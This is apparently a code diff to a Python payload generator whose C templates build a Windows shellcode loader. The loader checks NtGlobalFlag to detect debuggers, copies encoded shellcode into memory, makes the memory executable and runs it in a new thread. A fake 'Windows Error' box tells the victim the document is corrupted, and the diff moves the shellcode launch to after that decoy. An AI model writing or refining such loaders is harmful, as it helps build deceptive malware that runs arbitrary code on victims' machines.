@@ -40,9 +40,11 @@ HEADERS_C_CODE = """
 #include <time.h>
 #include <ctype.h>
 #include <windows.h>
+
+#define DEBUG
 #undef DEBUG
 
-#define BIG_NUMBER 100000000
+#define BIG_NUMBER 1<<30
 """
 
 STUB_C_CODE = """
@@ -65,9 +67,9 @@ int CheckNtGlobalFlag()
        :
        : "eax" );
   printf("fs is %#x\\n", eax);
-  eax = eax+0x30;
+  eax = eax+0x30; // get peb
   printf("fs[30h] is %#x\\n", eax);
-  eax = eax+0x68;
+  eax = eax+0x68; // get flag
   printf("NtGlobalFlag is %#x\\n", eax);
   return eax & 0x70;
 }
@@ -77,7 +79,13 @@ LPVOID AllocAndMap(HANDLE *hFile, unsigned char* sc, DWORD dwBytesToRead)
 {
   LPVOID code;
   DWORD  dwBytesRead;
-  code = VirtualAlloc(NULL, dwBytesToRead, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
+  DWORD  dwAllocSize;
+  SYSTEM_INFO siSysInfo;
+
+  GetSystemInfo(&siSysInfo);
+  dwAllocSize = siSysInfo.dwPageSize > dwBytesToRead ? siSysInfo.dwPageSize : dwBytesToRead;
+
+  code = VirtualAlloc(NULL, dwAllocSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
   if (!code) {
 #ifdef DEBUG
     printf("[-] VirtualAlloc\\n");
@@ -85,20 +93,8 @@ LPVOID AllocAndMap(HANDLE *hFile, unsigned char* sc, DWORD dwBytesToRead)
     return NULL;
   }
 
-  if (hFile) {
-    if( !ReadFile(*hFile, code, dwBytesToRead, &dwBytesRead, NULL) || dwBytesRead != dwBytesToRead ) {
-#ifdef DEBUG
-      printf("[-] ReadFile\\n");
-#endif
-      VirtualFree(code, dwBytesToRead, MEM_RELEASE);
-      return NULL;
-    }
-  } else if (sc) {
-    code = memcpy(code, sc, dwBytesToRead);
-  }
-
+  code = memcpy(code, sc, dwBytesToRead);
   return code;
-
 }
 
 
@@ -130,14 +126,12 @@ TEMPLATE_C_CODE = """
 
   hdlMutex = CreateMutex(NULL, TRUE, _T("f0000000000000000000000000baaaaaaaaaaaaaaaaaaaar"));
   if(!hdlMutex)
-    exit(1);
+    exit(2);
 
-#ifndef DEBUG
-  FreeConsole();
-#endif
-  if (!key) exit(1);
+  CloseHandle(hdlMutex);
+
   code = AllocAndMap(NULL, encoded_shellcode, len);
-  if (!code) exit(1);
+  if (!code) exit(3);
 
 #ifdef DEBUG
   printf("[+] Shellcode alloc-ed at %p\\n", code);
@@ -153,7 +147,7 @@ TEMPLATE_C_CODE = """
     printf("[-] failed to set 0x%p as executable\\n", code);
 #endif
     VirtualFree(code, len, MEM_RELEASE);
-    exit(1);
+    exit(4);
   }
 #ifdef DEBUG
   printf("[+] Page %p set as executable\\n", code);
@@ -161,6 +155,7 @@ TEMPLATE_C_CODE = """
   FreeConsole();
 #endif
 
+  FlushInstructionCache(GetCurrentProcess(), code, len);
   hdlThread = CreateThread(NULL, 0, SpawnShellcode, code, 0, &pID);
 
   WaitForSingleObject(hdlThread, INFINITE);
@@ -170,7 +165,7 @@ TEMPLATE_C_CODE = """
 TEMPLATE_WIN32_CODE = """
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-""" + TEMPLATE_C_CODE + """
+
   MessageBoxA(NULL,
   "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
   "If this happened for the first time, try re-opening the document."
@@ -178,6 +173,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
   ,
   "Windows Error",
   MB_ICONERROR | MB_OK);
+
+""" + TEMPLATE_C_CODE + """
 
   return retcode;
 }
@@ -186,7 +183,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 TEMPLATE_EXE_CODE = """
 int main(int argc, char** argv, char** envp)
 {
-""" + TEMPLATE_C_CODE + """
 
   MessageBoxA(NULL,
   "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
@@ -195,6 +191,8 @@ int main(int argc, char** argv, char** envp)
   ,
   "Windows Error",
   MB_ICONERROR | MB_OK);
+
+""" + TEMPLATE_C_CODE + """
 
   return retcode;
 }
